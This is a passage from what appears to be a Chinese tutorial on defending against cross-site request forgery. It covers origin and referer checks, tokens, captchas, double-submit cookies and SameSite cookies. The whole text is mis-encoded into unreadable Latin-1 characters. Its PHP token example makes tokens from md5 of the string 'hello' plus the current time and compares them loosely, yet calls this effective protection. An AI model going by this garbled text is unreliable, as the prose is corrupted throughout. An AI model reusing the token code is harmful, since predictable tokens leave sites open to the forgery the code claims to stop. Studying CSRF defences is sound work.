å°æ˜ç”±äºåˆšåˆšå°±ç™»é™†äº†Gmailï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å‘é€æ—¶ï¼Œæºå¸¦ç€å°æ˜çš„ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ï¼ŒGmailçš„åå°æ¥æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯äº†ç¡®å®æœ‰å°æ˜çš„ç™»å½•å‡­è¯ï¼Œäºæ˜¯æˆåŠŸç»™å°æ˜é…ç½®äº†è¿‡æ»¤å™¨ã€‚ é»‘å®¢å¯ä»¥æŸ¥çœ‹å°æ˜çš„æ‰€æœ‰é‚®ä»¶ï¼ŒåŒ…æ‹¬é‚®ä»¶é‡Œçš„åŸŸåéªŒè¯ç ç­‰éšç§ä¿¡æ¯ã€‚æ‹¿åˆ°éªŒè¯ç ä¹‹åï¼Œé»‘å®¢å°±å¯ä»¥è¦æ±‚åŸŸåæœåŠ¡å•†æŠŠåŸŸåé‡ç½®ç»™è‡ªå·±ã€‚ å°æ˜å¾ˆå¿«æ‰“å¼€Gmailï¼Œæ‰¾åˆ°äº†é‚£æ¡è¿‡æ»¤å™¨ï¼Œå°†å…¶åˆ é™¤ã€‚ç„¶è€Œï¼Œå·²ç»æ³„éœ²çš„é‚®ä»¶ï¼Œå·²ç»è¢«è½¬è®©çš„åŸŸåï¼Œå†ä¹Ÿæ— æ³•æŒ½å›äº†â€¦â€¦ ä»¥ä¸Šå°±æ˜¯å°æ˜çš„æ‚²æƒ¨é­é‡ã€‚è€Œâ€œç‚¹å¼€ä¸€ä¸ªé»‘å®¢çš„é“¾æ¥ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½è¢«çªƒå–â€è¿™ç§äº‹æƒ…å¹¶ä¸æ˜¯æœæ’°çš„ï¼Œæ­¤äº‹ä»¶åŸå‹æ˜¯2007å¹´Gmailçš„CSRFæ¼æ´ 7ã€CSRFæ¼æ´é˜²å¾¡ ä¿®æ”¹å¯†ç æ—¶,éœ€è¦åŸå¯†ç ; å¯¹å®¢æˆ·æ¥è®²,ä¸è¦ç‚¹å‡»æ¥å†ä¸æ˜çš„é“¾æ¥æˆ–å›¾ç‰‡;å…»æˆå®šæ—¶é€€å‡ºçš„å¥½ä¹ æƒ¯;å®‰è£…å®‰å…¨é˜²æŠ¤è½¯ä»¶ç­‰ éªŒè¯ Referer/Content-Type å¯¹äºç”¨æˆ·ä¿®æ”¹åˆ é™¤ç­‰æ“ä½œæœ€å¥½éƒ½ä½¿ç”¨POSTæ“ä½œ é¿å…å…¨ç«™é€šç”¨çš„Cookieï¼Œä¸¥æ ¼è®¾ç½®Cookieçš„åŸŸ CSRFé€šå¸¸ä»ç¬¬ä¸‰æ–¹ç½‘ç«™å‘èµ·ï¼Œè¢«æ”»å‡»çš„ç½‘ç«™æ— æ³•é˜²æ­¢æ”»å‡»å‘ç”Ÿï¼Œåªèƒ½é€šè¿‡å¢å¼ºè‡ªå·±ç½‘ç«™é’ˆå¯¹CSRFçš„é˜²æŠ¤èƒ½åŠ›æ¥æå‡å®‰å…¨æ€§ã€‚ ä¸Šæ–‡ä¸­è®²äº†CSRFçš„ä¸¤ä¸ªç‰¹ç‚¹ï¼š CSRFï¼ˆé€šå¸¸ï¼‰å‘ç”Ÿåœ¨ç¬¬ä¸‰æ–¹åŸŸåã€‚ CSRFæ”»å‡»è€…ä¸èƒ½è·å–åˆ°Cookieç­‰ä¿¡æ¯ï¼Œåªæ˜¯ä½¿ç”¨ã€‚ é’ˆå¯¹è¿™ä¸¤ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä¸“é—¨åˆ¶å®šé˜²æŠ¤ç­–ç•¥ï¼Œå¦‚ä¸‹ï¼š é˜»æ­¢ä¸æ˜å¤–åŸŸçš„è®¿é—® åŒæºæ£€æµ‹ Samesite Cookie æäº¤æ—¶è¦æ±‚é™„åŠ æœ¬åŸŸæ‰èƒ½è·å–çš„ä¿¡æ¯ CSRF Token åŒé‡CookieéªŒè¯ ä»¥ä¸‹æˆ‘ä»¬å¯¹å„ç§é˜²æŠ¤æ–¹æ³•åšè¯¦ç»†è¯´æ˜ã€‚ 7.1 åŒæºæ£€æµ‹ æ—¢ç„¶CSRFå¤§å¤šæ¥è‡ªç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç›´æ¥ç¦æ­¢å¤–åŸŸï¼ˆæˆ–è€…ä¸å—ä¿¡ä»»çš„åŸŸåï¼‰å¯¹æˆ‘ä»¬å‘èµ·è¯·æ±‚ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œæˆ‘ä»¬å¦‚ä½•åˆ¤æ–­è¯·æ±‚æ˜¯å¦æ¥è‡ªå¤–åŸŸå‘¢ï¼Ÿ åœ¨HTTPåè®®ä¸­ï¼Œæ¯ä¸€ä¸ªå¼‚æ­¥è¯·æ±‚éƒ½ä¼šæºå¸¦ä¸¤ä¸ªHeaderï¼Œç”¨äºæ ‡è®°æ¥æºåŸŸåï¼š Origin Header Referer Header è¿™ä¸¤ä¸ªHeaderåœ¨æµè§ˆå™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œå¤§å¤šæ•°æƒ…å†µä¼šè‡ªåŠ¨å¸¦ä¸Šï¼Œå¹¶ä¸”ä¸èƒ½ç”±å‰ç«¯è‡ªå®šä¹‰å†…å®¹ã€‚ æœåŠ¡å™¨å¯ä»¥é€šè¿‡è§£æè¿™ä¸¤ä¸ªHeaderä¸­çš„åŸŸåï¼Œç¡®å®šè¯·æ±‚çš„æ¥æºåŸŸã€‚ ä½¿ç”¨Origin Headerç¡®å®šæ¥æºåŸŸå åœ¨éƒ¨åˆ†ä¸CSRFæœ‰å…³çš„è¯·æ±‚ä¸­ï¼Œè¯·æ±‚çš„Headerä¸­ä¼šæºå¸¦Originå­—æ®µã€‚å­—æ®µå†…åŒ…å«è¯·æ±‚çš„åŸŸåï¼ˆä¸åŒ…å«pathåŠqueryï¼‰ã€‚ å¦‚æœOriginå­˜åœ¨ï¼Œé‚£ä¹ˆç›´æ¥ä½¿ç”¨Originä¸­çš„å­—æ®µç¡®è®¤æ¥æºåŸŸåå°±å¯ä»¥ã€‚ ä½†æ˜¯Originåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹å¹¶ä¸å­˜åœ¨ï¼š IE11åŒæºç­–ç•¥ï¼š IE 11 ä¸ä¼šåœ¨è·¨ç«™CORSè¯·æ±‚ä¸Šæ·»åŠ Originæ ‡å¤´ï¼ŒRefererå¤´å°†ä»ç„¶æ˜¯å”¯ä¸€çš„æ ‡è¯†ã€‚æœ€æ ¹æœ¬åŸå› æ˜¯å› ä¸ºIE 11å¯¹åŒæºçš„å®šä¹‰å’Œå…¶ä»–æµè§ˆå™¨æœ‰ä¸åŒï¼Œæœ‰ä¸¤ä¸ªä¸»è¦çš„åŒºåˆ«ï¼Œå¯ä»¥å‚è€ƒMDN Same-origin_policy#IE_Exceptions 302é‡å®šå‘ï¼š åœ¨302é‡å®šå‘ä¹‹åOriginä¸åŒ…å«åœ¨é‡å®šå‘çš„è¯·æ±‚ä¸­ï¼Œå› ä¸ºOriginå¯èƒ½ä¼šè¢«è®¤ä¸ºæ˜¯å…¶ä»–æ¥æºçš„æ•æ„Ÿä¿¡æ¯ã€‚å¯¹äº302é‡å®šå‘çš„æƒ…å†µæ¥è¯´éƒ½æ˜¯å®šå‘åˆ°æ–°çš„æœåŠ¡å™¨ä¸Šçš„URLï¼Œå› æ­¤æµè§ˆå™¨ä¸æƒ³å°†Originæ³„æ¼åˆ°æ–°çš„æœåŠ¡å™¨ä¸Šã€‚ ä½¿ç”¨Referer Headerç¡®å®šæ¥æºåŸŸå æ ¹æ®HTTPåè®®ï¼Œåœ¨HTTPå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå«Refererï¼Œè®°å½•äº†è¯¥HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚ å¯¹äºAjaxè¯·æ±‚ï¼Œå›¾ç‰‡å’Œscriptç­‰èµ„æºè¯·æ±‚ï¼ŒRefererä¸ºå‘èµ·è¯·æ±‚çš„é¡µé¢åœ°å€ã€‚å¯¹äºé¡µé¢è·³è½¬ï¼ŒRefererä¸ºæ‰“å¼€é¡µé¢å†å²è®°å½•çš„å‰ä¸€ä¸ªé¡µé¢åœ°å€ã€‚å› æ­¤æˆ‘ä»¬ä½¿ç”¨Refererä¸­é“¾æ¥çš„Originéƒ¨åˆ†å¯ä»¥å¾—çŸ¥è¯·æ±‚çš„æ¥æºåŸŸåã€‚ è¿™ç§æ–¹æ³•å¹¶éä¸‡æ— ä¸€å¤±ï¼ŒRefererçš„å€¼æ˜¯ç”±æµè§ˆå™¨æä¾›çš„ï¼Œè™½ç„¶HTTPåè®®ä¸Šæœ‰æ˜ç¡®çš„è¦æ±‚ï¼Œä½†æ˜¯æ¯ä¸ªæµè§ˆå™¨å¯¹äºRefererçš„å…·ä½“å®ç°å¯èƒ½æœ‰å·®åˆ«ï¼Œå¹¶ä¸èƒ½ä¿è¯æµè§ˆå™¨è‡ªèº«æ²¡æœ‰å®‰å…¨æ¼æ´ã€‚ä½¿ç”¨éªŒè¯ Referer å€¼çš„æ–¹æ³•ï¼Œå°±æ˜¯æŠŠå®‰å…¨æ€§éƒ½ä¾èµ–äºç¬¬ä¸‰æ–¹ï¼ˆå³æµè§ˆå™¨ï¼‰æ¥ä¿éšœï¼Œä»ç†è®ºä¸Šæ¥è®²ï¼Œè¿™æ ·å¹¶ä¸æ˜¯å¾ˆå®‰å…¨ã€‚åœ¨éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥éšè—ï¼Œç”šè‡³ä¿®æ”¹è‡ªå·±è¯·æ±‚çš„Refererã€‚ 7.2 Tokené˜²å¾¡ CSRFæ¼æ´å®è´¨ï¼šæœåŠ¡å™¨æ— æ³•å‡†ç¡®åˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦æ˜¯åˆæ³•ç”¨æˆ·çš„è‡ªå®šä¹‰æ“ä½œ æ¼æ´ä¿®è¡¥é€»è¾‘åˆ†æ:å¦‚æœæœåŠ¡å™¨åœ¨ç”¨æˆ·ç™»å½•ä¹‹åç»™äºˆç”¨æˆ·ä¸€ä¸ªå”¯ä¸€åˆæ³•ä»¤ç‰Œï¼Œæ¯ä¸€æ¬¡æ“ä½œè¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡å™¨éƒ½ä¼šéªŒè¯ä»¤ç‰Œæ˜¯å¦æ­£ç¡®ï¼Œå¦‚æœæ­£ç¡®é‚£ä¹ˆæ‰§è¡Œæ“ä½œï¼Œä¸æ­£ç¡®ä¸æ‰§è¡Œæ“ä½œã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œç»™äºˆçš„ä»¤ç‰Œå†™å…¥è¡¨å•éšè—åŸŸçš„valueä¸­ï¼Œéšç€è¡¨å•å†…å®¹è¿›è¡Œæäº¤ Tokené˜²å¾¡ä»£ç åˆ†æ ä»£ç çš„æ„æ€æ˜¯helloåŠ ä¸Šå½“å‰æ—¶é—´è¿›è¡Œmd5ç¼–ç ï¼Œå½“ç„¶helloå¯ä»¥æ”¹ä¸ºå…¶å®ƒå¤æ‚çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·ä¸å®¹æ˜“è¢«ç ´è§£å‡ºæ¥ï¼Œæ¯ä¸€ç§’çš„å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå¦‚ å®ä¾‹ä½¿ç”¨Tokenè¿›è¡ŒCSRFé˜²å¾¡ 1.ç™»é™†éªŒè¯æˆåŠŸä¹‹åï¼Œåœ¨ä¼šè¯SESSION[â€œuser_tokenâ€]ä¸­ä¿å­˜Token 2.åœ¨åå°æ“ä½œä¸­ï¼Œå¢åˆ æ”¹è¡¨å•ä¸­æ·»åŠ éšè—åŸŸhiddenï¼Œè®¾ç½®valueä¸ºToken 3.æäº¤ä¹‹åéªŒè¯Tokenæ˜¯å¦æ­£ç¡® é™„ä¸Šä»£ç  &lt;?php session_start(); function token_generate() { $salt = \"hello\".date(\"h:i:s\"); $token = md5($salt); return $token; } $token = token_generate(); $_SESSION[\"user_token\"] = $token; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;CSRF_TOKEN&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;CSRF_TOKEN&lt;/h1&gt; &lt;form action=\"check.php\" method=\"post\"&gt; &lt;input type=\"text\" value=\"111\"&gt; &lt;input type=\"hidden\" name=\"user_token\" value=\"&lt;?php echo $token;?&gt;\"&gt; &lt;input type=\"submit\" name=\"submit\" value=\"æäº¤\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; å†é™„ä¸Šcheck.phpéªŒè¯è„šæœ¬ä»£ç  &lt;?php session_start(); $user_token = $_POST[\"user_token\"]; if($_SESSION[\"user_token\"] == $user_token) { echo $_SESSION[\"user_token\"]; echo \"&lt;br&gt;\"; echo \"$user_token\"; echo \"&lt;br&gt;\"; echo \"successful\"; } else { echo \"fail\"; } ?&gt; ä¸ºä½•tokenå¯ä»¥æœ‰æ•ˆåœ°é˜²å¾¡ï¼š token æ˜¯è¢«å¼€å‘è€…å‘é€ç»™åç«¯çš„ï¼Œæ”»å‡»è€…å¦‚æœæ— æ³•è·å–åˆ°token æ˜¯æ— æ³•é€šè¿‡åç«¯æœåŠ¡å™¨çš„æ ¡éªŒçš„ ä½†æ˜¯cookie ä¸åŒï¼Œåªè¦åœ¨åŒä¸€ä¸ªæµè§ˆå™¨ï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨å°†cookie æ”¾å…¥è¯·æ±‚å¤´ä¸­ï¼Œå¦‚æœç”¨cookie åšç™»å½•éªŒè¯ï¼Œåœ¨åŒä¸€ä¸ªæµè§ˆå™¨å¹¶ä¸”ä¸€ç™»é™†çš„æƒ…å†µä¸‹åç«¯æœåŠ¡å™¨å°†è‡ªåŠ¨è¯†åˆ«cookie å¯¹è¯·æ±‚è¿›è¡Œæ”¾è¡Œä¾‹å¦‚ï¼š å°æ˜ç™»å½•äº†csdn, æ­¤æ—¶å°æ˜çªç„¶æƒ³åˆ°äº†ä¸€ä»¶äº‹æƒ…ï¼Œç™»å½•äº†å¦ä¸€ä¸ªç½‘ç«™ï¼Œè€Œè¿™ä¸ªç½‘ç«™è¢«ä¸çŸ¥åçš„äººåŸ‹å…¥äº†ä¸€äº›è¯·æ±‚ï¼Œè¿™äº›è¯·æ±‚æ˜¯å½“å…¶ä»–äººè¿›å…¥è¯¥ç½‘ç«™ï¼Œåˆ™è¯·æ±‚csdn å‹å¥½çš„å¸®åŠ©è®¿é—®è€…å‘å¸ƒä¸€ç¯‡æ–‡ç« ï¼Œ å‡å¦‚csdn ä½¿ç”¨çš„æ˜¯cookieåšç™»å½•åˆ¤æ–­ï¼Œå°æ˜è®¿é—®è¯¥ç½‘ç«™æ—¶è§¦å‘äº†è¯¥è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å°†cookie æ”¾å…¥è¯·æ±‚å¤´ä¸­ä¼ ç»™åç«¯ï¼Œåç«¯æœåŠ¡å™¨åˆ¤æ–­cookie æ˜¯å·²ç™»å½•åˆ™æ”¾è¡Œäº†è¯¥ç½‘ç«™çš„æ“ä½œï¼Œå°æ˜åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¢«å‘å¸ƒçš„ä¸€ç¯‡æ–‡ç« ï¼Œè¿™é‡Œåªæ˜¯ä¸€ä¸ªä¾‹å­ï¼Œä½†æ˜¯å¦‚æœè¿™é‡Œçš„è¯·æ±‚å˜ä¸ºè‡ªåŠ¨å°†å°æ˜çš„é’±åŒ…ä½™é¢è½¬è´¦ç»™é‚£ä½ä¸çŸ¥åçš„äººï¼Œå°±æ¯”è¾ƒå±é™©äº† è€Œå¦‚æœä½¿ç”¨token,token å¹¶ä¸ä¼šè‡ªåŠ¨è¢«æµè§ˆå™¨æ”¾å…¥è¯·æ±‚å¤´ï¼Œå½“å…¶ä»–æ”»å‡»è€…åƒæœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶ï¼Œæ˜¯ä¸ä¼šæºå¸¦token çš„ï¼Œåç«¯æœåŠ¡å™¨æ²¡æœ‰è·å–åˆ°token åˆ™ä¸ä¼šå¯¹è¯·æ±‚è¿›è¡Œæ”¾è¡Œï¼Œä¿è¯äº†ç”¨æˆ·æ•°æ®çš„å®‰å…¨æ€§ Refereré˜²å¾¡CSRFåŸç†ï¼šHTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºäºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç† å½“ç”¨æˆ·ç‚¹å‡»è¢«æ„é€ å¥½çš„CSRFåˆ©ç”¨é¡µé¢ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œç”¨æˆ·å¯¹åº”æ“ä½œæ—¶ï¼Œæäº¤çš„HTTPè¯·æ±‚ä¸­å°±æœ‰å¯¹åº”çš„Refererå€¼ï¼Œæ­¤æ—¶æœåŠ¡ç«¯åˆ¤æ–­Refererå€¼æ˜¯å¦ä¸æœåŠ¡å™¨çš„åŸŸåä¿¡æ¯æœ‰å…³ï¼Œå¦‚æœä¸å…³åˆ™ä¸æ‰§è¡Œæ“ä½œ Referé˜²å¾¡ä»£ç ç¼–å†™ åœ¨PHPä¸­ä½¿ç”¨$_SERVER[â€˜HTTP_REFERERâ€™]è·å–é¡µé¢æäº¤è¯·æ±‚ä¸­çš„Refererå€¼ è¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªstrposå‡½æ•°ï¼Œç”¨æ³•å‚è€ƒhttps://www.w3school.com.cn/php/func_string_strpos.asp é™„ä¸Šé˜²å¾¡ä»£ç ï¼š strposå‡½æ•°é‡Œé¢çš„æ„æ€ä¹Ÿå°±æ˜¯åœ¨è·å–çš„Refererå€¼é‡Œé¢æ˜¯å¦åŒ…å«xx.comè¿™ä¸ªåŸŸåï¼Œå¦‚æœåŒ…å«äº†è¯´æ˜æ˜¯æ­£ç¡®çš„ï¼Œæ²¡åŒ…å«å°±å¯èƒ½æ˜¯æ¶æ„çš„ 7.4 éªŒè¯ç é˜²å¾¡CSRF éªŒè¯ç é˜²å¾¡è¢«è®¤ä¸ºæ˜¯å¯¹æŠ—CSRFæœ€ç®€å•è€Œä¸”æœ‰æ•ˆçš„é˜²å¾¡æ–¹æ³•ï¼ŒCSRFåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å®Œæˆå¯¹åº”æ“ä½œï¼Œè€ŒéªŒè¯ç å¼ºåˆ¶ç”¨æˆ·ä¸åº”ç”¨ç¨‹åºäº¤äº’ï¼Œæ‰èƒ½æœ€ç»ˆå®Œæˆæ“ä½œï¼Œå¯ä»¥è¢«è®¤ä¸ºæ˜¯äºŒæ¬¡éªŒè¯ï¼Œä½†æ˜¯å‡ºäºå¯¹ç”¨æˆ·ä½“éªŒè€ƒè™‘ï¼Œä¸å¯èƒ½æ¯ä¸€æ¬¡æ“ä½œéƒ½åŠ å…¥éªŒè¯ç ã€‚æ‰€ä»¥éªŒè¯ç åªæ˜¯ä¸€ç§è¾…åŠ©æ‰‹æ®µï¼Œä¸èƒ½ä½œä¸ºé˜²å¾¡CSRFçš„ä¸»è¦è§£å†³æ–¹æ¡ˆ ç†è®ºä¸Šè®²ï¼Œåœ¨æäº¤è¡¨å•æˆ–è€…GETè¯·æ±‚çš„åœ°æ–¹ï¼Œå‡¡æ˜¯æ²¡æœ‰ç”¨æˆ·è¿›è¡ŒäºŒæ¬¡éªŒè¯æˆ–æ²¡æœ‰csrftoken(å…¶ä»–ç½‘ç«™å¯èƒ½ä¸å«csrftoken)çš„åœ°æ–¹å¤§æ¦‚ç‡å­˜åœ¨csrfæ¼æ´ã€‚ 7.5 åŒé‡CookieéªŒè¯ åœ¨ä¼šè¯ä¸­å­˜å‚¨CSRF Tokenæ¯”è¾ƒç¹çï¼Œè€Œä¸”ä¸èƒ½åœ¨é€šç”¨çš„æ‹¦æˆªä¸Šç»Ÿä¸€å¤„ç†æ‰€æœ‰çš„æ¥å£ã€‚ é‚£ä¹ˆå¦ä¸€ç§é˜²å¾¡æªæ–½æ˜¯ä½¿ç”¨åŒé‡æäº¤Cookieã€‚åˆ©ç”¨CSRFæ”»å‡»ä¸èƒ½è·å–åˆ°ç”¨æˆ·Cookieçš„ç‰¹ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥è¦æ±‚Ajaxå’Œè¡¨å•è¯·æ±‚æºå¸¦ä¸€ä¸ªCookieä¸­çš„å€¼ã€‚ åŒé‡Cookieé‡‡ç”¨ä»¥ä¸‹æµç¨‹ï¼š åœ¨ç”¨æˆ·è®¿é—®ç½‘ç«™é¡µé¢æ—¶ï¼Œå‘è¯·æ±‚åŸŸåæ³¨å…¥ä¸€ä¸ªCookieï¼Œå†…å®¹ä¸ºéšæœºå­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚csrfcookie=v8g9e4ksfhwï¼‰ã€‚ åœ¨å‰ç«¯å‘åç«¯å‘èµ·è¯·æ±‚æ—¶ï¼Œå–å‡ºCookieï¼Œå¹¶æ·»åŠ åˆ°URLçš„å‚æ•°ä¸­ï¼ˆæ¥ä¸Šä¾‹POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhwï¼‰ã€‚ åç«¯æ¥å£éªŒè¯Cookieä¸­çš„å­—æ®µä¸URLå‚æ•°ä¸­çš„å­—æ®µæ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´åˆ™æ‹’ç»ã€‚ æ­¤æ–¹æ³•ç›¸å¯¹äºCSRF Tokenå°±ç®€å•äº†è®¸å¤šã€‚å¯ä»¥ç›´æ¥é€šè¿‡å‰åç«¯æ‹¦æˆªçš„çš„æ–¹æ³•è‡ªåŠ¨åŒ–å®ç°ã€‚åç«¯æ ¡éªŒä¹Ÿæ›´åŠ æ–¹ä¾¿ï¼Œåªéœ€è¿›è¡Œè¯·æ±‚ä¸­å­—æ®µçš„å¯¹æ¯”ï¼Œè€Œä¸éœ€è¦å†è¿›è¡ŒæŸ¥è¯¢å’Œå­˜å‚¨Tokenã€‚ å½“ç„¶ï¼Œæ­¤æ–¹æ³•å¹¶æ²¡æœ‰å¤§è§„æ¨¡åº”ç”¨ï¼Œå…¶åœ¨å¤§å‹ç½‘ç«™ä¸Šçš„å®‰å…¨æ€§è¿˜æ˜¯æ²¡æœ‰CSRF Tokené«˜ï¼ŒåŸå› æˆ‘ä»¬ä¸¾ä¾‹è¿›è¡Œè¯´æ˜ã€‚ ç”±äºä»»ä½•è·¨åŸŸéƒ½ä¼šå¯¼è‡´å‰ç«¯æ— æ³•è·å–Cookieä¸­çš„å­—æ®µï¼ˆåŒ…æ‹¬å­åŸŸåä¹‹é—´ï¼‰ï¼Œäºæ˜¯å‘ç”Ÿäº†å¦‚ä¸‹æƒ…å†µï¼š å¦‚æœç”¨æˆ·è®¿é—®çš„ç½‘ç«™ä¸ºwww.a.comï¼Œè€Œåç«¯çš„apiåŸŸåä¸ºapi.a.comã€‚é‚£ä¹ˆåœ¨www.a.comä¸‹ï¼Œå‰ç«¯æ‹¿ä¸åˆ°api.a.comçš„Cookieï¼Œä¹Ÿå°±æ— æ³•å®ŒæˆåŒé‡Cookieè®¤è¯ã€‚ äºæ˜¯è¿™ä¸ªè®¤è¯Cookieå¿…é¡»è¢«ç§åœ¨a.comä¸‹ï¼Œè¿™æ ·æ¯ä¸ªå­åŸŸéƒ½å¯ä»¥è®¿é—®ã€‚ ä»»ä½•ä¸€ä¸ªå­åŸŸéƒ½å¯ä»¥ä¿®æ”¹a.comä¸‹çš„Cookieã€‚ æŸä¸ªå­åŸŸåå­˜åœ¨æ¼æ´è¢«XSSæ”»å‡»ï¼ˆä¾‹å¦‚upload.a.comï¼‰ã€‚è™½ç„¶è¿™ä¸ªå­åŸŸä¸‹å¹¶æ²¡æœ‰ä»€ä¹ˆå€¼å¾—çªƒå–çš„ä¿¡æ¯ã€‚ä½†æ”»å‡»è€…ä¿®æ”¹äº†a.comä¸‹çš„Cookieã€‚ æ”»å‡»è€…å¯ä»¥ç›´æ¥ä½¿ç”¨è‡ªå·±é…ç½®çš„Cookieï¼Œå¯¹XSSä¸­æ‹›çš„ç”¨æˆ·å†å‘www.a.comä¸‹ï¼Œå‘èµ·CSRFæ”»å‡»ã€‚ æ€»ç»“ï¼š ç”¨åŒé‡Cookieé˜²å¾¡CSRFçš„ä¼˜ç‚¹ï¼š æ— éœ€ä½¿ç”¨Sessionï¼Œé€‚ç”¨é¢æ›´å¹¿ï¼Œæ˜“äºå®æ–½ã€‚ Tokenå‚¨å­˜äºå®¢æˆ·ç«¯ä¸­ï¼Œä¸ä¼šç»™æœåŠ¡å™¨å¸¦æ¥å‹åŠ›ã€‚ ç›¸å¯¹äºTokenï¼Œå®æ–½æˆæœ¬æ›´ä½ï¼Œå¯ä»¥åœ¨å‰åç«¯ç»Ÿä¸€æ‹¦æˆªæ ¡éªŒï¼Œè€Œä¸éœ€è¦ä¸€ä¸ªä¸ªæ¥å£å’Œé¡µé¢æ·»åŠ ã€‚ ç¼ºç‚¹ï¼š Cookieä¸­å¢åŠ äº†é¢å¤–çš„å­—æ®µã€‚ å¦‚æœæœ‰å…¶ä»–æ¼æ´ï¼ˆä¾‹å¦‚XSSï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥æ³¨å…¥Cookieï¼Œé‚£ä¹ˆè¯¥é˜²å¾¡æ–¹å¼å¤±æ•ˆã€‚ éš¾ä»¥åšåˆ°å­åŸŸåçš„éš”ç¦»ã€‚ ä¸ºäº†ç¡®ä¿Cookieä¼ è¾“å®‰å…¨ï¼Œé‡‡ç”¨è¿™ç§é˜²å¾¡æ–¹å¼çš„æœ€å¥½ç¡®ä¿ç”¨æ•´ç«™HTTPSçš„æ–¹å¼ï¼Œå¦‚æœè¿˜æ²¡åˆ‡HTTPSçš„ä½¿ç”¨è¿™ç§æ–¹å¼ä¹Ÿä¼šæœ‰é£é™©ã€‚ 7.6 Samesite Cookieå±æ€§ é˜²æ­¢CSRFæ”»å‡»çš„åŠæ³•å·²ç»æœ‰ä¸Šé¢çš„é¢„é˜²æªæ–½ã€‚ä¸ºäº†ä»æºå¤´ä¸Šè§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒGoogleèµ·è‰äº†ä¸€ä»½è‰æ¡ˆæ¥æ”¹è¿›HTTPåè®®ï¼Œé‚£å°±æ˜¯ä¸ºSet-Cookieå“åº”å¤´æ–°å¢Samesiteå±æ€§ï¼Œå®ƒç”¨æ¥æ ‡æ˜è¿™ä¸ª Cookieæ˜¯ä¸ªâ€œåŒç«™ Cookieâ€ï¼ŒåŒç«™Cookieåªèƒ½ä½œä¸ºç¬¬ä¸€æ–¹Cookieï¼Œä¸èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹Cookieï¼ŒSamesite æœ‰ä¸¤ä¸ªå±æ€§å€¼ï¼Œåˆ†åˆ«æ˜¯ Strict å’Œ Laxï¼Œä¸‹é¢åˆ†åˆ«è®²è§£ï¼š Samesite=Strict è¿™ç§ç§°ä¸ºä¸¥æ ¼æ¨¡å¼ï¼Œè¡¨æ˜è¿™ä¸ª Cookie åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸å¯èƒ½ä½œä¸ºç¬¬ä¸‰æ–¹ Cookieï¼Œç»æ— ä¾‹å¤–ã€‚æ¯”å¦‚è¯´ b.com è®¾ç½®äº†å¦‚ä¸‹ Cookieï¼š Set-Cookie: foo=1; Samesite=Strict Set-Cookie: bar=2; Samesite=Lax Set-Cookie: baz=3 æˆ‘ä»¬åœ¨ a.com ä¸‹å‘èµ·å¯¹ b.com çš„ä»»æ„è¯·æ±‚ï¼Œfoo è¿™ä¸ª Cookie éƒ½ä¸ä¼šè¢«åŒ…å«åœ¨ Cookie è¯·æ±‚å¤´ä¸­ï¼Œä½† bar ä¼šã€‚ä¸¾ä¸ªå®é™…çš„ä¾‹å­å°±æ˜¯ï¼Œå‡å¦‚æ·˜å®ç½‘ç«™ç”¨æ¥è¯†åˆ«ç”¨æˆ·ç™»å½•ä¸å¦çš„ Cookie è¢«è®¾ç½®æˆäº† Samesite=Strictï¼Œé‚£ä¹ˆç”¨æˆ·ä»ç™¾åº¦æœç´¢é¡µé¢ç”šè‡³å¤©çŒ«é¡µé¢çš„é“¾æ¥ç‚¹å‡»è¿›å…¥æ·˜å®åï¼Œæ·˜å®éƒ½ä¸ä¼šæ˜¯ç™»å½•çŠ¶æ€ï¼Œå› ä¸ºæ·˜å®çš„æœåŠ¡å™¨ä¸ä¼šæ¥å—åˆ°é‚£ä¸ª Cookieï¼Œå…¶å®ƒç½‘ç«™å‘èµ·çš„å¯¹æ·˜å®çš„ä»»æ„è¯·æ±‚éƒ½ä¸ä¼šå¸¦ä¸Šé‚£ä¸ª Cookieã€‚ Samesite=Lax è¿™ç§ç§°ä¸ºå®½æ¾æ¨¡å¼ï¼Œæ¯” Strict 